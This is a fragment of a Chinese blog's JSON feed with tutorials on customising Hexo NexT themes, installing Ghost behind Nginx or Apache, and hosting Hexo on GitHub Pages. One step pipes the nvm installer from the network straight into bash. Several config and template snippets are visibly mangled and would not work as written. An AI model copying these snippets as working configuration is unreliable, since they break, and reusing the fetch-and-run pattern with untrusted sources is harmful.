编辑主题源文件</h3>\n<p><code>./themes/layout/_parrials/footer.swing</code></p>\n<p>找到以下代码区块</p>\n<div><pre><code>{% if theme.footer.theme.enable %} /* ... */ {% endif %}\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>在 <code>&lt;/div&gt;</code> 之前添加</p>\n<div><pre><code><span><span><span>&lt;</span>span</span><span>></span></span> | <span><span><span>&lt;/</span>span</span><span>></span></span> <span><span><span>&lt;</span>span</span> <span>id</span><span><span>=</span><span>\"</span>showDays<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>span</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>在该文件末尾处添加</p>\n<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n  <span>var</span> seconds <span>=</span> <span>1000</span><span>;</span>\n  <span>var</span> minutes <span>=</span> seconds <span>*</span> <span>60</span><span>;</span>\n  <span>var</span> hours <span>=</span> minutes <span>*</span> <span>60</span><span>;</span>\n  <span>var</span> days <span>=</span> hours <span>*</span> <span>24</span><span>;</span>\n  <span>var</span> years <span>=</span> days <span>*</span> <span>365</span><span>;</span>\n  <span>var</span> birthDay <span>=</span> Date<span>.</span><span>UTC</span><span>(</span><span>2016</span><span>,</span> <span>07</span><span>,</span> <span>30</span><span>,</span> <span>00</span><span>,</span> <span>00</span><span>,</span> <span>00</span><span>)</span><span>;</span> <span>// 这里设置建站时间</span>\n  <span>setInterval</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>\n    <span>var</span> today <span>=</span> <span>new</span> <span>Date</span><span>(</span><span>)</span><span>;</span>\n    <span>var</span> todayYear <span>=</span> today<span>.</span><span>getFullYear</span><span>(</span><span>)</span><span>;</span>\n    <span>var</span> todayMonth <span>=</span> today<span>.</span><span>getMonth</span><span>(</span><span>)</span> <span>+</span> <span>1</span><span>;</span>\n    <span>var</span> todayDate <span>=</span> today<span>.</span><span>getDate</span><span>(</span><span>)</span><span>;</span>\n    <span>var</span> todayHour <span>=</span> today<span>.</span><span>getHours</span><span>(</span><span>)</span><span>;</span>\n    <span>var</span> todayMinute <span>=</span> today<span>.</span><span>getMinutes</span><span>(</span><span>)</span><span>;</span>\n    <span>var</span> todaySecond <span>=</span> today<span>.</span><span>getSeconds</span><span>(</span><span>)</span><span>;</span>\n    <span>var</span> now <span>=</span> Date<span>.</span><span>UTC</span><span>(</span>\n      todayYear<span>,</span>\n      todayMonth<span>,</span>\n      todayDate<span>,</span>\n      todayHour<span>,</span>\n      todayMinute<span>,</span>\n      todaySecond\n    <span>)</span><span>;</span>\n    <span>var</span> diff <span>=</span> now <span>-</span> birthDay<span>;</span>\n    <span>var</span> diffYears <span>=</span> Math<span>.</span><span>floor</span><span>(</span>diff <span>/</span> years<span>)</span><span>;</span>\n    <span>var</span> diffDays <span>=</span> Math<span>.</span><span>floor</span><span>(</span>diff <span>/</span> days <span>-</span> diffYears <span>*</span> <span>365</span><span>)</span><span>;</span>\n    <span>var</span> diffHours <span>=</span> Math<span>.</span><span>floor</span><span>(</span>\n      <span>(</span>diff <span>-</span> <span>(</span>diffYears <span>*</span> <span>365</span> <span>+</span> diffDays<span>)</span> <span>*</span> days<span>)</span> <span>/</span> hours\n    <span>)</span><span>;</span>\n    <span>var</span> diffMinutes <span>=</span> Math<span>.</span><span>floor</span><span>(</span>\n      <span>(</span>diff <span>-</span> <span>(</span>diffYears <span>*</span> <span>365</span> <span>+</span> diffDays<span>)</span> <span>*</span> days <span>-</span> diffHours <span>*</span> hours<span>)</span> <span>/</span> minutes\n    <span>)</span><span>;</span>\n    <span>var</span> diffSeconds <span>=</span> Math<span>.</span><span>floor</span><span>(</span>\n      <span>(</span>diff <span>-</span>\n        <span>(</span>diffYears <span>*</span> <span>365</span> <span>+</span> diffDays<span>)</span> <span>*</span> days <span>-</span>\n        diffHours <span>*</span> hours <span>-</span>\n        diffMinutes <span>*</span> minutes<span>)</span> <span>/</span>\n        seconds\n    <span>)</span><span>;</span>\n    document<span>.</span><span>getElementById</span><span>(</span><span>\"showDays\"</span><span>)</span><span>.</span>innerHTML <span>=</span>\n      <span>\"本站已运行 \"</span> <span>+</span>\n      diffYears <span>+</span>\n      <span>\" 年 \"</span> <span>+</span>\n      diffDays <span>+</span>\n      <span>\" 天 \"</span> <span>+</span>\n      diffHours <span>+</span>\n      <span>\" 小时 \"</span> <span>+</span>\n      diffMinutes <span>+</span>\n      <span>\" 分钟 \"</span> <span>+</span>\n      diffSeconds <span>+</span>\n      <span>\" 秒\"</span><span>;</span>\n  <span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"开启页面动画效果\" tabindex=\"-1\"> 开启页面动画效果</h2>\n<h3 id=\"编辑主题配置文件\" tabindex=\"-1\"> 编辑主题配置文件</h3>\n<p><code>./themes/_config.yml</code></p>\n<div><pre><code><span>#</span>\nCanvas <span>-</span> nest\n<span>canvas_nest</span><span>:</span> <span>true</span>\n\n<span>vendors</span><span>:</span> <span>#Internal version: 1.0 .0# https: //github.com/hustcc/canvas-nest.js</span>\n    <span>canvas_nest</span><span>:</span> //cdn.bootcss.com/canvas<span>-</span>nest.js/1.0.1/canvas<span>-</span>nest.min.js\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"新的评论系统\" tabindex=\"-1\"> 新的评论系统</h2>\n<div><p>提示</p>\n<p>自从多说和网易云跟帖都挂了之后, Next 官方引入了 Valine 这一款评论系统</p>\n</div>\n<h3 id=\"关于-valine-的介绍\" tabindex=\"-1\"> 关于 Valine 的介绍</h3>\n<div><p>提示</p>\n<p>请移步 <a href=\"https://ioliu.cn/2017/add-valine-comments-to-your-blog/\" target=\"_blank\" rel=\"noopener noreferrer\">Valine -- 一款极简的评论系统</a>, 配置中出现 <code>leancloud application appid</code> 和 <code>leancloud application appkey</code> 获取方法也请看此链接</p>\n</div>\n<p>相关的配置指南 <a href=\"https://valine.js.org/\" target=\"_blank\" rel=\"noopener noreferrer\">https://valine.js.org/</a></p>\n<h3 id=\"编辑主题配置文件-1\" tabindex=\"-1\"> 编辑主题配置文件</h3>\n<p><code>./themes/_config.yml</code></p>\n<div><pre><code><span>#</span>\nValine.<span>#You can get your appid and appkey from https: //leancloud.cn</span>\n    <span>#more info please open https: //github.com/xCss/Valine</span>\n    <span>valine</span><span>:</span>\n    <span>enable</span><span>:</span> <span>true</span>\n<span>appid</span><span>:</span> <span>#your leancloud application appid</span>\n<span>appkey</span><span>:</span> <span>#your leancloud application appkey</span>\n<span>notify</span><span>:</span> <span>false</span><span># mail notifier, https: //github.com/xCss/Valine/wiki</span>\n    <span>verify</span><span>:</span> <span>false</span><span># Verification code</span>\n<span>placeholder</span><span>:</span> ヾﾉ≧∀≦) o 亲爱的小主<span>,</span> 有何指教\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"使用最新的-valine\" tabindex=\"-1\"> 使用最新的 Valine</h3>\n<h4 id=\"修改主题源码文件\" tabindex=\"-1\"> 修改主题源码文件</h4>\n<p><code>./themes/layout/_third-party/comments/valine.swig</code></p>\n<div><pre><code><span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>\"</span>//unpkg.com/valine/dist/Valine.min.js<span>\"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n<span><span><span>&lt;</span>script</span> <span>type</span><span><span>=</span><span>\"</span>text/javascript<span>\"</span></span><span>></span></span><span><span>\n  <span>new</span> <span>Valine</span><span>(</span><span>{</span>\n      <span>av</span><span>:</span> <span>AV</span><span>,</span>\n      <span>el</span><span>:</span> <span>'#comments'</span><span>,</span>\n      <span>app_id</span><span>:</span> <span>'{{ theme.valine.appid }}'</span><span>,</span>\n      <span>app_key</span><span>:</span> <span>'{{ theme.valine.appkey }}'</span><span>,</span>\n      <span>placeholder</span><span>:</span> <span>'{{ theme.valine.placeholder }}'</span><span>,</span> <span>// 默认 null</span>\n      <span>notify</span><span>:</span> <span>{</span>\n          <span>{</span>\n              theme<span>.</span>valine<span>.</span>notify\n          <span>}</span>\n      <span>}</span><span>,</span> <span>// 默认 false</span>\n      <span>verify</span><span>:</span> <span>{</span>\n          <span>{</span>\n              theme<span>.</span>valine<span>.</span>verify\n          <span>}</span>\n      <span>}</span><span>,</span> <span>// 默认 false</span>\n      <span>path</span><span>:</span> <span>{</span>\n          <span>{</span>\n              theme<span>.</span>valine<span>.</span>path\n          <span>}</span>\n      <span>}</span><span>,</span> <span>// 默认 window.location.pathname</span>\n      <span>avatar</span><span>:</span> <span>'{{ theme.valine.avatar }}'</span> <span>// 默认 ''</span>\n  <span>}</span><span>)</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2017-10-28T20:24:59.000Z",
      "date_modified": "2022-08-01T13:55:22.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "nodejs"
      ]
    },
    {
      "title": "在你的 VPS 服务器搭建 Ghost 博客系统",
      "url": "https://vxhly.github.io/views/nodejs/insatll-ghost-on-your-vps.html",
      "id": "https://vxhly.github.io/views/nodejs/insatll-ghost-on-your-vps.html",
      "summary": "前言\nGhost 采用 Node.js 编写, 默认使用 SQLite3 数据库, 非常轻量, 因为是文件型数据库, 所以无需安装。Ghost 允许多用户编写博文, 使用 Markdown 来编写博文。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Ghost 采用 Node.js 编写, 默认使用 SQLite3 数据库, 非常轻量, 因为是文件型数据库, 所以无需安装。Ghost 允许多用户编写博文, 使用 Markdown 来编写博文。</p>\n</div>\n\n<h2 id=\"下载-ghost\" tabindex=\"-1\"> 下载 Ghost</h2>\n<p><a href=\"http:////www.ghostchina.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Ghost 中文官网</a> <a href=\"http:////ghost.org/\" target=\"_blank\" rel=\"noopener noreferrer\">Ghost 英文官网</a></p>\n<h2 id=\"ghost-中文集成版-推介\" tabindex=\"-1\"> Ghost 中文集成版(推介)</h2>\n<p><a href=\"http://dl.ghostchina.com/Ghost-0.7.4-zh-full.zip\" target=\"_blank\" rel=\"noopener noreferrer\">最新版本: Ghost v0.7.4 full (zh)</a></p>\n<div><p>提示</p>\n<p>上方链接已失效, 米娜桑可以通过这个来下载 <a href=\"http://oss-blog.test.upcdn.net/Ghost-0.7.4-zh-full-master.zip\" target=\"_blank\" rel=\"noopener noreferrer\">最新版本: Ghost v0.7.4 full (zh)</a></p>\n</div>\n<p>版本特色: 中文汉化、支持七牛、又拍云、阿里云 OSS 存储；增加 Roon 主题；集成 node_modules , 无需忍受 <code>npm install --production</code> 的麻烦。</p>\n<h3 id=\"ghost-中文标准版\" tabindex=\"-1\"> Ghost 中文标准版</h3>\n<p><a href=\"http://dl.ghostchina.com/Ghost-0.7.4-zh.zip\" target=\"_blank\" rel=\"noopener noreferrer\">最新版本: Ghost v0.7.4 (zh)</a></p>\n<p>版本特色: 中文汉化、支持七牛、又拍云、阿里云 OSS 存储；增加 Roon 主题</p>\n<h3 id=\"ghost-英文原版\" tabindex=\"-1\"> Ghost 英文原版</h3>\n<p><a href=\"http://dl.ghostchina.com/Ghost-0.7.4.zip\" target=\"_blank\" rel=\"noopener noreferrer\">最新版本: Ghost v0.7.4</a></p>\n<h2 id=\"安装前准备\" tabindex=\"-1\"> 安装前准备</h2>\n<h3 id=\"vps-服务器和域名\" tabindex=\"-1\"> VPS 服务器和域名</h3>\n<p>VPS 个人服务器当然是必不可少的, 解析域名的的时候推介解析为 www</p>\n<h3 id=\"node-js\" tabindex=\"-1\"> Node.js</h3>\n<p>Ghost 对 Node.js 版本号要求比较严格, Ghost 官方推荐使用 <code>Node 0.10.x</code> 版本, 同时支持 <code>Node 0.12.x</code> 和 <code>Node 4.2.x</code> 版本。</p>\n<p>这边推介使用稳定版 <code>Node 4.2.x</code> 。</p>\n<p>安装 Node 推介使用 <code>nvm</code> 安装。</p>\n<div><pre><code><span>wget</span> -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh <span>|</span> <span>bash</span>\nnvm <span>install</span> <span>4.2</span>\nnvm <span>alias</span> defaults <span>4.2</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"需要-nginx-服务\" tabindex=\"-1\"> 需要 Nginx 服务</h3>\n<p>Ghost 默认监听的端口为 2368, 而且只监听本地的 IP 地址进行访问, 所以需要 Nginx 这个服务来转发流量</p>\n<p>Ubuntu 下安装直接执行命令</p>\n<div><pre><code><span>apt-get</span> <span>install</span> nginx\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"ghost-web-服务器转发原理介绍\" tabindex=\"-1\"> Ghost+Web 服务器转发原理介绍</h3>\n<p>官方文档建议使用 Nginx 作为 Ghost 的前端来转发 80 端口请求, 那么 Ghost 的工作总流程就可以描述为:</p>\n<div><p>提示</p>\n<p>Nginx 监听 80 端口, Ghost 一直监听本地 127.0.0.1:2368 端口, 你从外网访问 www.xxx.com 时, Nginx 从 80 端口接收请求, 将之转发到本地 127.0.0.1:2368 端口, 然后 Ghost 就收到访问请求了。</p>\n</div>\n<p>可是为什么不直接让 Ghost 使用 80 端口呢却要依赖 Web 服务器转发呢？这是因为 Ghost 需要运行在 root 权限上, 为了避免风险, 就用 Nginx 转发一下。另外, Nginx 毕竟是 Web 服务器, 配置灵活、并发高, 用来做 Ghost 的前端是非常适合的, 如果你服务器上还有其他网站那就更要用 Nginx 了, 不然你的 80 端口给了 Ghost 就没法负载其他网站了。</p>\n<h3 id=\"解压文件\" tabindex=\"-1\"> 解压文件</h3>\n<div><pre><code><span>unzip</span> -uo <span>[</span>fileName<span>]</span>.zip -d <span>[</span>folderName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"开始配置使用\" tabindex=\"-1\"> 开始配置使用</h2>\n<h3 id=\"安装依赖\" tabindex=\"-1\"> 安装依赖</h3>\n<p>如果你下载的不是 Ghost 中文集成版, 那么你就需要在你的项目目录下执行</p>\n<div><pre><code><span>npm</span> <span>install</span> --production\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>当然, 这需要翻墙, Ghost 所依赖的默认数据库 sqlite 包需要从国外服务器上（亚马逊的云存储服务）下载原生插件, 即使是翻墙了也未必能下载下来, 因为 sqlite 的原生插件没有通过 npm 分发。</p>\n<h3 id=\"配置-config-js\" tabindex=\"-1\"> 配置 config.js</h3>\n<p>解压缩之后会有一个 <code>config.example.js</code> 默认配置文件, 你需要把它复制重命名成 <code>config.js</code></p>\n<div><pre><code><span>cp</span> config.example.js config.js\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"配置-url\" tabindex=\"-1\"> 配置 URL</h4>\n<div><pre><code><span>// ...</span>\nconfig <span>=</span> <span>{</span>\n  <span>production</span><span>:</span> <span>{</span>\n    <span>url</span><span>:</span> <span>\"//www.yourdomian\"</span><span>,</span>\n    <span>// ...</span>\n  <span>}</span><span>,</span>\n  <span>// ...</span>\n<span>}</span><span>;</span>\n<span>// ...</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>注意这边必须写上 <code>//</code> 或者 <code>//</code> , 这里写的 URL 就是以后注册账号和登录后台时所用的 URL, 必须完全一样, 如果注册时用的 URL 和这里的不一样, 那么就会出现错误提示说无权限访问！</p>\n<h3 id=\"配置-nginx-服务进行转发\" tabindex=\"-1\"> 配置 Nginx 服务进行转发</h3>\n<p>打开 <code>/etc/nginx/nginx.conf</code> , 在 http 语句块内追加上:</p>\n<div><pre><code>server {\n  listen 80;\n  server_name www.yourdomian;\n\n  location / {\n    proxy_set_header   X-Real-IP $remote_addr;\n    proxy_set_header   Host  $http_host;\n    proxy_pass http://127.0.0.1:2368;\n  }\n}\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"重启-nginx\" tabindex=\"-1\"> 重启 Nginx</h4>\n<div><pre><code>/etc/init.d/nginx restart\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"配置-apache-服务进行转发\" tabindex=\"-1\"> 配置 Apache 服务进行转发</h2>\n<p>打开 <code>/etc/httpd/conf/httpd.conf</code></p>\n<div><pre><code># NameVirtualHost *:80 #这一行取消注释\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>再在文件末尾加上如下语句, 配置请求转发</p>\n<div><pre><code>&lt;VirtualHost *:80>\n    ServerName linuxidc.com\n    ProxyRequests Off\n    ProxyPreserveHost On\n&lt;Proxy *>\n    AddDefaultCharset Off\n    Order deny,allow\n    Allow from all\n&lt;/Proxy>\n    ProxyPass / http://127.0.0.1:2368/\n    ProxyPassReverse / http://127.0.0.1:2368/\n&lt;/VirtualHost>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"重启-httpd-服务\" tabindex=\"-1\"> 重启 httpd 服务</h4>\n<div><pre><code><span>service</span> httpd restart\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"启动-ghost-服务\" tabindex=\"-1\"> 启动 Ghost 服务</h2>\n<div><pre><code><span>npm</span> start --production\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>现在启动 Ghost 并访问域名已经能进入博客页面了, 但下面还需要实现 Ghost 后台运行, 不然你退了终端的话 Ghost 就停止了。</p>\n<h3 id=\"使用-forever-让-ghost-后台运行\" tabindex=\"-1\"> 使用 Forever 让 Ghost 后台运行</h3>\n<h4 id=\"安装-forever-包\" tabindex=\"-1\"> 安装 forever 包</h4>\n<div><pre><code><span>npm</span> <span>install</span> forever -g\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"启动-ghost\" tabindex=\"-1\"> 启动 Ghost</h4>\n<div><pre><code><span>NODE_ENV</span><span>=</span>production forever start index.js\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"关闭-ghost\" tabindex=\"-1\"> 关闭 Ghost</h4>\n<div><pre><code>forever stop index.js\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"重启动-ghost\" tabindex=\"-1\"> 重启动 Ghost</h4>\n<div><pre><code><span>NODE_ENV</span><span>=</span>production forever restart index.js\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"查看运行状态用这条命令\" tabindex=\"-1\"> 查看运行状态用这条命令</h4>\n<div><pre><code>forever list\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"访问\" tabindex=\"-1\"> 访问</h3>\n<p>前台: <a href=\"http://www.yourdomian\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.yourdomian</a> 后台: <a href=\"http://www.yourdomian/ghost\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.yourdomian/ghost</a></p>\n<h2 id=\"拓展配置\" tabindex=\"-1\"> 拓展配置</h2>\n<h3 id=\"ghost-邮件系统设置详解\" tabindex=\"-1\"> Ghost 邮件系统设置详解</h3>\n<p><a href=\"http://www.ghostchina.com/mail-configuration-on-self-hosted-version-of-ghost/\" target=\"_blank\" rel=\"noopener noreferrer\">Ghost 邮件系统设置详解</a></p>\n<h3 id=\"为博客增加-标签云\" tabindex=\"-1\"> 为博客增加 &quot;标签云&quot;</h3>\n<p><a href=\"http://www.ghostchina.com/output-tag-cloud/\" target=\"_blank\" rel=\"noopener noreferrer\">为博客增加 &quot;标签云&quot;</a></p>\n",
      "date_published": "2017-06-02T14:53:49.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "nodejs"
      ]
    },
    {
      "title": "使用 Hexo+NexT 在 Github 上搭建静态博客",
      "url": "https://vxhly.github.io/views/nodejs/install-hexo-next-on-github.html",
      "id": "https://vxhly.github.io/views/nodejs/install-hexo-next-on-github.html",
      "summary": "前言\nHexo 是一个快速, 简单而高效的静态博客框架, 本文将介绍如何在 GitHub 上使用 Hexo+NexT 搭建静态博客。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Hexo 是一个快速, 简单而高效的静态博客框架, 本文将介绍如何在 GitHub 上使用 Hexo+NexT 搭建静态博客。</p>\n</div>\n\n<h2 id=\"准备\" tabindex=\"-1\"> 准备</h2>\n<div><p>提示</p>\n<p>你需要在 <a href=\"http://github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Github</a> 上创建一个属于自己的账户, 然后新建一个仓库（new repository）, 并命名为 YourSiteName.github.io, 此时 Github 会帮助你初始化一个静态网页, 你可以根据自己的喜好选择一些模版（这都不是重点）, 接着尝试访问下你所建的站点, 成功后就可以开始动工了。</p>\n</div>\n<h3 id=\"node-js-环境\" tabindex=\"-1\"> Node.js 环境</h3>\n<p>需安装 nvm, 任何版本皆可</p>\n<div><pre><code>nvm <span>5</span>\nnvm <span>alias</span> defaults <span>5</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"安装-git\" tabindex=\"-1\"> 安装 Git</h3>\n<p>如果你的系统没有 git, 则必装</p>\n<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> <span>git</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"hexo-初始化博客框架\" tabindex=\"-1\"> Hexo 初始化博客框架</h2>\n<div><p>提示</p>\n<p>参考链接<br> <a href=\"http://hexo.io/zh-cn/\" target=\"_blank\" rel=\"noopener noreferrer\">Hexo 官网</a><br> <a href=\"http://hexo.io/zh-cn/docs/\" target=\"_blank\" rel=\"noopener noreferrer\">Hexo 配置文档</a><br> <a href=\"http://hexo.io/zh-cn/docs/commands.html\" target=\"_blank\" rel=\"noopener noreferrer\">Hexo 相关指令</a><br> <a href=\"http://github.com/hexojs/hexo/wiki/Themes\" target=\"_blank\" rel=\"noopener noreferrer\">Hexo 主题</a></p>\n</div>\n<h3 id=\"安装-hexo\" tabindex=\"-1\"> 安装 Hexo</h3>\n<div><pre><code><span>npm</span> <span>install</span> -g hexo-cli\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"初始化框架\" tabindex=\"-1\"> 初始化框架</h3>\n<div><pre><code>hexo init <span>[</span>yourFolder<span>]</span>\n<span>cd</span> <span>[</span>folderName<span>]</span>\n<span>npm</span> <span>install</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h4 id=\"新建文章\" tabindex=\"-1\"> 新建文章</h4>\n<div><pre><code>hexo new <span>\"Hello World\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>在 <code>./source/_post</code> 里添加 <code>hello-world.md</code> 文件, 之后新建的文章都将存放在此目录下。</p>\n<h4 id=\"新建页面\" tabindex=\"-1\"> 新建页面</h4>\n<div><pre><code>hexo new page tags\nhexo new page categories\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>在 <code>./source/</code> 里添加 <code>tags</code> 和 <code>categories</code> 目录, 即标签页和分类页</p>\n<h4 id=\"取消标签页和分类页的评论功能\" tabindex=\"-1\"> 取消标签页和分类页的评论功能</h4>\n<p>标签页 <code>./source/categories/index.md</code></p>\n<div><pre><code><span><span>---</span>\n<span><span>title</span><span>:</span> <span>null</span>\n<span>date</span><span>:</span>\n<span>type</span><span>:</span> <span>\"categories\"</span>\n<span>comments</span><span>:</span> <span>false</span></span>\n<span>---</span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>分类页 <code>./source/tags/index.md</code></p>\n<div><pre><code><span><span>---</span>\n<span><span>title</span><span>:</span> <span>null</span>\n<span>date</span><span>:</span>\n<span>type</span><span>:</span> <span>\"tags\"</span>\n<span>comments</span><span>:</span> <span>false</span></span>\n<span>---</span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"建议修改默认的文章模板\" tabindex=\"-1\"> 建议修改默认的文章模板</h4>\n<div><pre><code><span>vim</span> ./scaffolds/post.md\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>修改成</p>\n<div><pre><code><span><span>---</span>\n<span><span>title</span><span>:</span> <span>{</span> <span>{</span> title <span>}</span> <span>}</span>\n<span>date</span><span>:</span> <span>{</span> <span>{</span> date <span>}</span> <span>}</span>\n\n<span>categories</span><span>:</span>\ntags<span>:</span></span>\n<span>---</span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"生成静态网站\" tabindex=\"-1\"> 生成静态网站</h3>\n<div><pre><code>hexo generate\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>此时会将 <code>/source</code> 的 <code>.md</code> 文件生成 <code>html</code> 文件到 <code>/public</code> 中, 形成网站的静态文件。</p>\n<h3 id=\"本地预览\" tabindex=\"-1\"> 本地预览</h3>\n<div><pre><code>hexo server -p <span>3000</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>输入 <code>//localhost:3000</code> 即可查看网站, 若无指定端口号, 将采用默认端口 <code>4000</code> 。 使用 <code>Ctrl + C</code> 快捷键终止该进程</p>\n<h3 id=\"部署网站至-github\" tabindex=\"-1\"> 部署网站至 github</h3>\n<div><pre><code>hexo deploy\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"静态化且部署简化命令\" tabindex=\"-1\"> 静态化且部署简化命令</h4>\n<div><pre><code>hexo g -d\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"部署网站前请配置\" tabindex=\"-1\"> 部署网站前请配置</h4>\n<p><code>./_config.yml</code></p>\n<div><pre><code><span>deploy</span><span>:</span>\n    <span>type</span><span>:</span> git\n<span>repo</span><span>:</span> <span>git @github.com</span><span>:</span> youName / youName.github.io.git\n<span>branch</span><span>:</span> master\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h4 id=\"部署前请执行\" tabindex=\"-1\"> 部署前请执行</h4>\n<div><pre><code><span>npm</span> <span>install</span> hexo-deployer-git --save\nhexo clean\nhexo generate\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"使用-next-主题让站点更酷炫\" tabindex=\"-1\"> 使用 NexT 主题让站点更酷炫</h2>\n<div><p>提示</p>\n<p>参考链接<br> <a href=\"http://theme-next.iissnan.com/\" target=\"_blank\" rel=\"noopener noreferrer\">NexT 参考文档</a><br> <a href=\"http://theme-next.iissnan.com/theme-settings.html\" target=\"_blank\" rel=\"noopener noreferrer\">NexT 主题配置</a><br> <a href=\"http://theme-next.iissnan.com/third-party-services.html\" target=\"_blank\" rel=\"noopener noreferrer\">NexT 第三方服务</a><br> <a href=\"http://theme-next.iissnan.com/faqs.html\" target=\"_blank\" rel=\"noopener noreferrer\">更多的配置问题</a></p>\n</div>\n<h3 id=\"下载主题\" tabindex=\"-1\"> 下载主题</h3>\n<div><pre><code><span>cd</span> <span>&lt;</span>yourFolder<span>></span>\n<span>git</span> clone https://github.com/iissnan/hexo-theme-next themes/next\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"修改配置文件\" tabindex=\"-1\"> 修改配置文件</h3>\n<div><pre><code><span>vim</span> ./_config.yml\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>修改</p>\n<div><pre><code>theme: next\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"验证主题效果\" tabindex=\"-1\"> 验证主题效果</h3>\n<div><pre><code>hexo s --debug\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>访问 <code>//localhost:4000</code> , 确保站点正确运行</p>\n<h2 id=\"站内搜索\" tabindex=\"-1\"> 站内搜索</h2>\n<h3 id=\"安装-hexo-generator-search\" tabindex=\"-1\"> 安装 hexo-generator-search</h3>\n<div><pre><code><span>npm</span> <span>install</span> hexo-generator-search --save\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"编辑配置文件\" tabindex=\"-1\"> 编辑配置文件</h3>\n<p><code>./_config.yml</code></p>\n<p>在任意位置添加以下内容</p>\n<div><pre><code><span>search</span><span>:</span>\n  <span>path</span><span>:</span> search.xml\n<span>field</span><span>:</span> post\n<span>format</span><span>:</span> html\n<span>limit</span><span>:</span> <span>10000</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"编辑主题配置文件\" tabindex=\"-1\"> 编辑主题配置文件</h3>\n<p><code>./themes/next/_config.yml</code></p>\n<div><pre><code><span>#</span>\nLocal search\n<span>local_search</span><span>:</span>\n    <span>enable</span><span>:</span> <span>true</span>\n</code></pre><div 